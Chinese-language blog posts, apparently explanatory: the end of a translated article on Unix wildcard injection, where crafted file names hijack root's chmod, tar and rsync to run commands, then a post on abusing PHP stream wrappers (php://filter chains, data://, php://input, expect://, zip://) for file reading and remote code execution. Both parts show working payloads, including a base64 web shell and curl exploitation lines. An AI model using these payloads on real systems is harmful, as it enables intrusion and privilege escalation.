<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@defensecode public]# <span class="built_in">ls</span> -al</span><br><span class="line">total 68</span><br><span class="line">drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .</span><br><span class="line">drwx------. 24 user user  4096 Oct 28 18:32 ..</span><br><span class="line">-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php</span><br><span class="line">-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php</span><br><span class="line">-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php</span><br><span class="line">-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php</span><br><span class="line">-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php</span><br><span class="line">-rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php</span><br><span class="line">-rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php</span><br><span class="line">-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php</span><br><span class="line">-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php</span><br><span class="line">-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php</span><br><span class="line">-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php</span><br><span class="line">-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php</span><br><span class="line">-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php</span><br></pre></td></tr></table></figure>

<p>root用户现在尝试把所有文件的权限设为 <code>000</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 000 *</span><br></pre></td></tr></table></figure>

<p>再看看权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@defensecode public]# <span class="built_in">ls</span> -al</span><br><span class="line">total 68</span><br><span class="line">drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .</span><br><span class="line">drwx------. 24 user user  4096 Oct 28 18:32 ..</span><br><span class="line">-rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php</span><br><span class="line">-rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php</span><br><span class="line">-rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php</span><br><span class="line">-rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php</span><br><span class="line">-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php</span><br><span class="line">-rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php</span><br><span class="line">-rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php</span><br><span class="line">-rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php</span><br><span class="line">-rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php</span><br><span class="line">-rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php</span><br><span class="line">-rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php</span><br><span class="line">-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php</span><br><span class="line">-rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php</span><br></pre></td></tr></table></figure>

<p>发生了什么？本来应该是 <code>000</code>，结果所有文件都成了 <code>777</code>，因为通过文件名注入了 <code>--reference</code> 选项。<br>再次说明：<code>leon</code> 拥有的 <code>.drf.php</code> 的权限是 <code>777</code>，被用作参考文件；既然提供了 <code>--reference</code>，那么<strong>所有文件都会被设为 777</strong>。<br>除了 <code>--reference</code>，攻击者还可以再造一个文件名为 <code>-R</code> 的文件，从而让 <code>chmod</code> 对<strong>子目录</strong>中的文件也<strong>递归</strong>地修改权限。</p>
<h2 id="tar任意命令执行"><a href="#tar任意命令执行" class="headerlink" title="tar任意命令执行"></a>tar任意命令执行</h2><p>上面的例子很好地说明了“所有权劫持”。现在我们来看更有意思的：<strong>任意命令执行</strong>。<code>tar</code> 是非常常见的 Unix 程序，用于创建与解压归档。<br>创建归档的常见用法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar cvvf archive.tar *</span><br></pre></td></tr></table></figure>

<p>那么 <code>tar</code> 有什么问题？问题在于 <code>tar</code> 的选项很多，其中从“任意参数注入”的角度看，有些选项非常有意思。<br>看 <code>tar</code> 手册（<code>man tar</code>）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--checkpoint[=NUMBER]</span><br><span class="line">        display progress messages every NUMBERth record (default 10)</span><br><span class="line"></span><br><span class="line"> --checkpoint-action=ACTION</span><br><span class="line">        execute ACTION on each checkpoint</span><br></pre></td></tr></table></figure>

<p>这里的 <code>--checkpoint-action</code> 可以指定在每次到达检查点时<strong>执行的程序</strong>。本质上，这就允许我们执行任意命令。<br>看下面的目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@defensecode public]# <span class="built_in">ls</span> -al</span><br><span class="line">total 72</span><br><span class="line">drwxrwxrwx.  2 user user  4096 Oct 28 19:34 .</span><br><span class="line">drwx------. 24 user user  4096 Oct 28 18:32 ..</span><br><span class="line">-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php</span><br><span class="line">-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php</span><br><span class="line">-rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1</span><br><span class="line">-rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=<span class="built_in">exec</span>=sh shell.sh</span><br><span class="line">-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php</span><br><span class="line">-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php</span><br><span class="line">-rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php</span><br><span class="line">-rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php</span><br><span class="line">-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php</span><br><span class="line">-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php</span><br><span class="line">-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php</span><br><span class="line">-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php</span><br><span class="line">-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php</span><br><span class="line">-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh</span><br></pre></td></tr></table></figure>

<p>现在，<code>root</code> 要把当前目录里的所有文件打包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar cf archive.tar *</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure>

<p>发生了什么？<code>/usr/bin/id</code> 被执行了！我们刚刚在 <strong>root 权限</strong>下实现了任意命令执行。<br>再看这些由 <code>leon</code> 创建的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1</span><br><span class="line">-rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=<span class="built_in">exec</span>=sh shell.sh</span><br><span class="line">-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh</span><br></pre></td></tr></table></figure>

<p><code>--checkpoint=1</code> 与 <code>--checkpoint-action=exec=sh shell.sh</code> 被当作命令行<strong>选项</strong>传给 <code>tar</code>。它们让 <code>tar</code> 在达到检查点时<strong>执行</strong> <code>shell.sh</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@defensecode public]# <span class="built_in">cat</span> shell.sh</span><br><span class="line">/usr/bin/id</span><br></pre></td></tr></table></figure>

<p>因此，通过这种 <code>tar</code> 参数污染，我们基本上可以以<strong>运行 <code>tar</code> 的用户</strong>的权限执行任意命令。</p>
<h2 id="rsync任意命令执行"><a href="#rsync任意命令执行" class="headerlink" title="rsync任意命令执行"></a>rsync任意命令执行</h2><p><code>rsync</code> 是“一个快速、多功能的远程（也可本地）文件复制工具”，在 Unix 系统上非常常见。<br>看一下 <code>rsync</code> 的手册，我们同样能找到能被滥用来进行<strong>任意命令执行</strong>的选项。</p>
<p><code>rsync</code> 手册摘录：<br>“像使用 <code>rcp</code> 一样使用 <code>rsync</code>。你必须指定源和目标，其中一个可以是远端。”</p>
<p>几个有意思的选项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-e, --rsh=COMMAND           指定要使用的远程 shell</span><br><span class="line">    --rsync-path=PROGRAM    指定在远端机器上运行的 rsync 程序</span><br></pre></td></tr></table></figure>

<p>我们直接滥用一下手册里的一个例子：把本地目录里所有 <code>*.c</code> 文件复制到远端主机 <code>foo</code> 的 <code>/src</code> 目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -t *.c foo:src/</span><br></pre></td></tr></table></figure>

<p>目录内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@defensecode public]# <span class="built_in">ls</span> -al</span><br><span class="line">total 72</span><br><span class="line">drwxrwxrwx.  2 user user  4096 Mar 28 04:47 .</span><br><span class="line">drwx------. 24 user user  4096 Oct 28 18:32 ..</span><br><span class="line">-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php</span><br><span class="line">-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php</span><br><span class="line">-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php</span><br><span class="line">-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php</span><br><span class="line">-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c</span><br><span class="line">-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php</span><br><span class="line">-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php</span><br><span class="line">-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php</span><br><span class="line">-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php</span><br><span class="line">-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php</span><br><span class="line">-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php</span><br><span class="line">-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php</span><br><span class="line">-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c</span><br></pre></td></tr></table></figure>

<p>现在 <code>root</code> 要把所有 C 文件复制到远端：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsync -t *.c foo:src/</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync: connection unexpectedly closed (0 bytes received so far) [sender]</span><br><span class="line">rsync error: error <span class="keyword">in</span> rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]</span><br></pre></td></tr></table></figure>

<p>看看发生了什么：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@defensecode public]# <span class="built_in">ls</span> -al</span><br><span class="line">total 76</span><br><span class="line">drwxrwxrwx.  2 user user  4096 Mar 28 04:49 .</span><br><span class="line">drwx------. 24 user user  4096 Oct 28 18:32 ..</span><br><span class="line">-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php</span><br><span class="line">-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php</span><br><span class="line">-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php</span><br><span class="line">-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php</span><br><span class="line">-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c</span><br><span class="line">-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php</span><br><span class="line">-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php</span><br><span class="line">-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php</span><br><span class="line">-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php</span><br><span class="line">-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php</span><br><span class="line">-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php</span><br><span class="line">-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php</span><br><span class="line">-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c</span><br><span class="line">-rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt</span><br></pre></td></tr></table></figure>

<p>目录里由 <code>leon</code> 拥有的两个文件是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c</span><br><span class="line">-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c</span><br></pre></td></tr></table></figure>

<p>执行 <code>rsync</code> 之后，目录里多了一个由 <code>root</code> 拥有的新文件 <code>shell_output.txt</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt</span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@defensecode public]# <span class="built_in">cat</span> shell_output.txt</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure>

<p>由于使用了 <code>*.c</code> 通配符，<code>rsync</code> 在命令行上得到了 <strong><code>-e sh shell.c</code></strong> 这个<strong>选项</strong>；于是 <code>rsync</code> 启动时执行了 <code>shell.c</code>。<br><code>shell.c</code> 的内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> shell.c </span><br><span class="line">/usr/bin/id &gt; shell_output.txt</span><br></pre></td></tr></table></figure>

<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>本文讨论的技巧可以以不同形式应用到各种流行的 Unix 工具上。在真实世界的攻击里，<strong>任意 shell 选项&#x2F;参数</strong>可以被悄悄地伪装在普通文件名之间，管理员很难一眼发现。更进一步地说，如果是 <strong>cron 任务</strong>、<strong>shell 脚本</strong>或 <strong>Web 应用</strong>去调用这些 shell 命令，<br>除此之外，可能还有更多流行的 Unix 工具会受到前述通配符攻击的影响。</p>
<p>感谢 Hrvoje Spoljar 和 Sec-Consult 就本文提供的一些想法。</p>
]]></content>
      <categories>
        <category>How It Works-临渊羡鱼</category>
        <category>译</category>
        <category>tricks</category>
      </categories>
  </entry>
  <entry>
    <title>PHP Wrapper 利用</title>
    <url>/post/20250311021811.html</url>
    <content><![CDATA[<h1 id="什么是php-wrapper"><a href="#什么是php-wrapper" class="headerlink" title="什么是php wrapper?"></a>什么是php wrapper?</h1><p>PHP wrapper基于流（stream）的概念，流是数据传输的抽象表示。wrapper定义了如何处理特定协议或资源（如文件、HTTP请求、内存流）的输入输出操作。每个wrapper通过PHP的流函数（如 <code>fopen()</code>、<code>file_get_contents</code>）与底层资源交互，提供统一的借口来操作不同类型的数据源。wrapper除了内置于PHP之外，也可以通过 <code>stream_wrapper_register()</code>自定义。</p>
<p>如以下php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;file://some.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="title function_ invoke__">feof</span>(<span class="variable">$handle</span>)!==<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">echofgets</span>(<span class="variable">$handle</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>等同于</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="string">&quot;file://some.txt&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="PHP内置Wrapper列表"><a href="#PHP内置Wrapper列表" class="headerlink" title="PHP内置Wrapper列表"></a>PHP内置Wrapper列表</h2><table>
<thead>
<tr>
<th>包装器名称</th>
<th>原理</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>file:&#x2F;&#x2F;</td>
<td>默认的文件系统包装器，允许访问本地文件系统中的文件和目录。</td>
<td>用于读取或写入本地文件，如配置文件、日志文件等。</td>
</tr>
<tr>
<td>http:&#x2F;&#x2F;</td>
<td>通过HTTP协议访问远程服务器上的资源，使用GET方法获取数据。</td>
<td>用于从Web服务器获取文件或数据（如API调用），常用于抓取网页内容。</td>
</tr>
<tr>
<td>https:&#x2F;&#x2F;</td>
<td>与http:&#x2F;&#x2F;类似，但通过SSL&#x2F;TLS加密传输数据。</td>
<td>用于安全地访问远程Web资源，常用于处理需要加密的HTTP请求。</td>
</tr>
<tr>
<td>ftp:&#x2F;&#x2F;</td>
<td>通过FTP协议访问远程FTP服务器上的文件，支持身份验证。</td>
<td>用于从FTP服务器下载或上传文件，常用于文件传输任务。</td>
</tr>
<tr>
<td>ftps:&#x2F;&#x2F;</td>
<td>FTP的加密版本，使用SSL&#x2F;TLS保护数据传输。</td>
<td>用于安全地传输文件到FTP服务器，适用于需要加密的场景。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;</td>
<td>特殊的I&#x2F;O流包装器，用于访问PHP进程的输入输出流或临时内存。</td>
<td>提供对标准输入输出、请求体、内存流的访问，常用于处理自定义输入输出或调试。</td>
</tr>
<tr>
<td>data:&#x2F;&#x2F;</td>
<td>允许直接嵌入数据到URI中，通常以Base64编码形式存储。</td>
<td>用于将小型数据（如图片或脚本）嵌入代码中，避免外部文件依赖，常用于测试或简单数据传递。</td>
</tr>
<tr>
<td>zip:&#x2F;&#x2F;</td>
<td>访问ZIP压缩文件内的内容，需提供ZIP文件路径和内部文件路径。</td>
<td>用于读取或操作ZIP文件中的内容，如解压特定文件，常用于处理压缩包。</td>
</tr>
<tr>
<td>phar:&#x2F;&#x2F;</td>
<td>访问PHP归档文件（Phar）中的内容，类似于ZIP但专为PHP设计。</td>
<td>用于运行或访问Phar打包的PHP应用，常用于分发PHP库或应用程序。</td>
</tr>
<tr>
<td>glob:&#x2F;&#x2F;</td>
<td>使用通配符模式匹配文件系统中的文件或目录。</td>
<td>用于批量处理文件，如查找所有.txt文件，常用于文件管理任务。</td>
</tr>
<tr>
<td>compress.zlib:&#x2F;&#x2F;</td>
<td>处理使用zlib（gzip）压缩的文件或流，支持读写操作。</td>
<td>用于解压或压缩文件，常用于处理.gz文件或节省存储空间。</td>
</tr>
<tr>
<td>compress.bzip2:&#x2F;&#x2F;</td>
<td>处理使用bzip2压缩的文件或流，支持读写操作。</td>
<td>用于解压或压缩文件，常用于处理.bz2文件，提供更高的压缩率。</td>
</tr>
<tr>
<td>ssh2:&#x2F;&#x2F;</td>
<td>通过SSH2协议访问远程服务器的文件系统或执行命令（需SSH2扩展）。</td>
<td>用于通过SSH安全地操作远程文件或执行命令，常用于服务器管理。</td>
</tr>
<tr>
<td>ogg:&#x2F;&#x2F;</td>
<td>处理Ogg Vorbis音频流（需oggvorbis扩展）。</td>
<td>用于读取或处理Ogg格式音频文件，常用于音频应用开发。</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="php-子包装器详解"><a href="#php-子包装器详解" class="headerlink" title="php:&#x2F;&#x2F; 子包装器详解"></a>php:&#x2F;&#x2F; 子包装器详解</h2><p>php:&#x2F;&#x2F;包装器功能丰富且用途广泛，其子类型如下：</p>
<table>
<thead>
<tr>
<th>子包装器</th>
<th>原理</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>php:&#x2F;&#x2F;stdin</td>
<td>提供对标准输入流的只读访问，等同于常量STDIN。</td>
<td>用于从命令行读取用户输入，适用于CLI脚本。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;stdout</td>
<td>提供对标准输出流的可写访问，等同于常量STDOUT。</td>
<td>用于向命令行输出数据，适用于CLI脚本。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;stderr</td>
<td>提供对标准错误流的可写访问，等同于常量STDERR。</td>
<td>用于输出错误信息到命令行，适用于CLI脚本中的错误处理。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;input</td>
<td>提供对HTTP请求原始数据的只读访问，获取请求体内容。</td>
<td>用于读取POST、PUT等请求的原始数据，常用于RESTful API处理。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;output</td>
<td>提供对输出缓冲区的可写访问，类似echo或print。</td>
<td>用于直接写入输出缓冲区，常用于动态生成内容。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;memory</td>
<td>在内存中创建读写流，数据始终存储在内存中。</td>
<td>用于临时存储数据，适合小规模数据处理，关闭后数据丢失。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;temp</td>
<td>在内存中创建读写流，超出指定大小（如2MB）后转为临时文件。</td>
<td>用于处理较大临时数据，内存不足时自动切换到文件存储。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;filter</td>
<td>元包装器，允许在打开流时应用过滤器（如编码或转换）。</td>
<td>用于在读取或写入时处理数据，如将文件内容转为Base64编码，常用于调试或安全检查。</td>
</tr>
</tbody></table>
<h1 id="在渗透测试中的利用"><a href="#在渗透测试中的利用" class="headerlink" title="在渗透测试中的利用"></a>在渗透测试中的利用</h1><h2 id="file"><a href="#file" class="headerlink" title="file://"></a><code>file://</code></h2><p>如果应用程序 <strong>未对用户输入的文件路径进行过滤</strong> ，攻击者可以使用 <code>file://</code> 访问服务器上的任意可读文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;file://C:/Windows/system.ini&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><code>php://filter</code></h2><p>在 <code>file://</code> 不可用或被WAF过滤时可以利用编码方式读取敏感信息</p>
<ol>
<li>base64读取php源码</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.base64-encode/resource=config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;base64_encoded_string&quot;</span> | base64 -d</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>filter chain结合LFI实现RCE</li>
</ol>
<blockquote>
<p>github: <a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
</blockquote>
<p><code>php_filter_chain_generator.py</code> 利用PHP过滤器的可组合性，通过精心设计的过滤器组合，将攻击者提供的PHP代码（如 <code>&lt;?php system(&#39;id&#39;); ?&gt;</code>）转换为可在目标上下文中执行的形式，具体来说是利用不同编码和转码之间的差异，在php中这种差异导致的错误会被忽略，从而生成了不符预期的字符</p>
<p>我们可以在python源码中看到作者构建好的字母和数字的filter chain</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">conversions <span class="operator">=</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>

<p>即便是没有可写入路径的情况下也可以通过 <code>php://temp</code>来利用。</p>
<blockquote>
<p>细节请阅读：<a href="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html">PHP filters chain: What is it and how to use it</a></p>
</blockquote>
<p>示例：利用filters chain向日志文件中注入恶意代码，然后利用LFI执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python3 php_filter_chain_generator.py --chain <span class="string">&#x27;&lt;?php system(&quot;id&quot;); ?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] The following gadget chain will generate the following code : <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;id&quot;</span>); <span class="meta">?&gt;</span> (base64 value: PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg)</span><br><span class="line">php:<span class="comment">//filter/convert.iconv.UTF8.CSISO2022KR|c...de/resource=/var/log/apache2/access.log</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Testers should make sure to change the $URL, $FILTERS with the chaining that generates their payload and $FILE with the path to the file they can read.</span></span><br><span class="line">curl --user-agent <span class="string">&quot;PENTEST&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>?parameter=php://filter/<span class="variable">$FILTERS</span>/resource=<span class="variable">$FILE</span>&quot;</span></span><br><span class="line"></span><br><span class="line">curl --user-agent <span class="string">&quot;PENTEST&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>?parameter=php://convert.base64-decode|...|resource=/var/log/apache2/access.log&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="data"><a href="#data" class="headerlink" title="data://"></a><code>data://</code></h2><p>前提： <code>allow_url_include</code>: on</p>
<p><code>data://</code> 允许在 URL 直接嵌入 Base64 编码的数据，并作为输入流。<code>include()</code> 会将 Base64 解码，并执行 PHP 代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Shell in base64 encoding</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php system(<span class="variable">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span> | <span class="built_in">base64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Accessing the log file via LFI</span></span><br><span class="line">curl --user-agent <span class="string">&quot;PENTEST&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>/?parameter=data://text/plain;base64,<span class="variable">$SHELL_BASE64</span>&amp;cmd=id&quot;</span></span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">include(<span class="string">&quot;data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+&quot;</span>);</span><br><span class="line">decode: &lt;?php system(<span class="string">&#x27;id&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a><code>php://input</code></h2><p>前提： <code>allow_url_include</code>: on</p>
<p><code>php://input</code> 允许读取 HTTP 请求的 <strong>原始输入数据</strong> 。会直接解析用户传入的代码并执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Testers should make sure to change the $URL</span></span><br><span class="line">curl --user-agent <span class="string">&quot;PENTEST&quot;</span> -s -X POST --data <span class="string">&quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot;</span> <span class="string">&quot;<span class="variable">$URL</span>?parameter=php://input&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X POST --data <span class="string">&quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot;</span> http://target.com/vuln.php</span><br></pre></td></tr></table></figure>

<h2 id="expect"><a href="#expect" class="headerlink" title="expect://"></a><code>expect://</code></h2><p>前提：expect extension</p>
<p>如果 <code>expect://</code> 被启用，可以直接执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl --user-agent <span class="string">&quot;PENTEST&quot;</span> -s <span class="string">&quot;<span class="variable">$URL</span>/?parameter=expect://id&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> file_get_contents(<span class="string">&quot;expect://ls -la&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="zip"><a href="#zip" class="headerlink" title="zip://"></a><code>zip://</code></h2><p>前提：可以上传.zip文件</p>
<p><code>zip://</code>会读取和执行zip中的文件，可以绕过一些检查, 可通过 <code>include(&#39;zip://evil.zip#shell.php&#39;) </code>来执行恶意代码</p>
